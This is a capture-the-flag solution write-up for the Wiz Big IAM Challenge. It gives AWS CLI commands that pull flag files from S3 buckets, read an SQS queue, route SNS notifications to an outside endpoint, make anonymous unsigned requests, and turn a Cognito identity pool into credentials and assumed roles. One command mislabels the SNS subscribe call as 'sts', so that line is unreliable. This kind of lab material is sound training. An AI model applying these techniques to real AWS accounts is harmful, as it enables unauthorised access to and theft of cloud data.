# Wiz Big IAM Challenge

https://thebigiamchallenge.com

## Challenge 1

```shell
aws sts get-caller-identity
aws s3 ls s3://thebigiamchallenge-storage-9979f4b/files
aws s3 cp s3://thebigiamchallenge-storage-9979f4b/files/flag1.txt /tmp/flag1.txt
```

## Challenge 2

```shell
# The queue URL can be found by inspecting the page HTML or build based on its ARN
aws sqs receive-message --queue-url https://sqs.us-east-1.amazonaws.com/092297851374/wiz-tbic-analytics-sqs-queue-ca7a1b2
```

## Challenge 3

```shell
# Let's subscribe to the topic with a custom HTTP endpoint listening for notifications.
aws sts subscribe --topic-arn arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications --notification-endpoint https://REDACTED/@tbic.wiz.io
```

## Challenge 4

```shell
# `--no-sign-request` causes the request to be anonymous.
# In this case, according to https://docs.aws.amazon.com/IAM/latest/UserGuide/reference_policies_condition-keys.html#condition-keys-principalarn
# the `aws:PrincipalArn` value is not populated.
# According to https://docs.aws.amazon.com/IAM/latest/UserGuide/reference_policies_elements_condition_operators.html#Conditions_String, `ForAllValues:StringLike` checks that:
# > All of the values for the condition key in the request must match at least one of the values in your policy.
# Since the value is not present it therefore returns true.
aws s3 ls s3://thebigiamchallenge-admin-storage-abf1321/files/ --no-sign-request
aws s3 cp s3://thebigiamchallenge-admin-storage-abf1321/files/flag-as-admin.txt /tmp/flag.txt
```

## Challenge 5

```shell
# Inspecting the page HTML gives us an AWS Cognito identity pool ID
aws cognito-identity get-id --identity-pool-id "us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b"
aws cognito-identity get-credentials-for-identity --identity-id "us-east-1:b293decf-cc8b-4082-96eb-70ba01c98d1e"
```

In another shell:
```shell
export AWS_ACCESS_KEY_ID=[...]
export AWS_SECRET_ACCESS_KEY=[...]
export AWS_SESSION_TOKEN=[...]
aws s3 ls s3://wiz-privatefiles/
aws s3 cp s3://wiz-privatefiles/flag1.txt .
```

## Challenge 6

```shell
aws cognito-identity get-id --identity-pool-id "us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b"
aws cognito-identity get-open-id-token --identity-id "us-east-1:5e3eaf20-3565-4894-bbf7-6a1836f7c27d"
aws sts assume-role-with-web-identity --role-arn arn:aws:iam::092297851374:role/Cognito_s3accessAuth_Role --role-session-name test --web-identity-token ${TOKEN}
```

In another shell:
```shell
export AWS_ACCESS_KEY_ID=[...]
export AWS_SECRET_ACCESS_KEY=[...]
export AWS_SESSION_TOKEN=[...]
aws s3api list-buckets
aws s3 ls s3://wiz-privatefiles-x1000
aws s3 cp s3://wiz-privatefiles-x1000/flag2.txt .
```
